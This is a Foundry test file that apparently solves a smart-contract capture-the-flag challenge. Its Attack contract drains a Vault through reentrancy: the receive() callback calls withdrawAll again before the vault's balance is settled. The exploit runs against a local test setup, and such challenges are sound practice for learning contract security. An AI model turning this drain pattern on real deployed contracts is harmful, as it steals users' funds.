// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Challenge.sol";

contract ChallengeTest is Test {
    Setup setup;
    address public playerAddress;

    function setUp() public {
        playerAddress = makeAddr("player");
        setup = new Setup{value: 1 ether}();
        vm.deal(playerAddress, 1 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint("player balance", playerAddress.balance, 18);
        emit log_named_decimal_uint("vault balance", address(setup.vault()).balance, 18);

        vm.startPrank(playerAddress, playerAddress);

        ////////// YOUR CODE GOES HERE //////////
        new Attack(address(setup.vault())).attack{value:1 ether}();
        ////////// YOUR CODE END //////////

        assertTrue(setup.isSolved(), "challenge not solved");
        vm.stopPrank();

        emit log_named_decimal_uint("player balance", playerAddress.balance, 18);
        emit log_named_decimal_uint("vault balance", address(setup.vault()).balance, 18);
    }
}

////////// YOUR CODE GOES HERE //////////
contract Attack {
    Vault c;
    mapping(address=>uint256) public balanceOf;
    constructor(address vaultaddress) {

        c=Vault(vaultaddress);
    }

    function attack() public payable {
        c.deposit{value:1 ether}();
        c.withdrawAll();
        (bool success,)=msg.sender.call{value:address(this).balance}("");
        require(success);
    }
    receive() external payable{
        if(msg.sender.balance != 0){
            c.withdrawAll();
        }

    }


}
////////// YOUR CODE END //////////
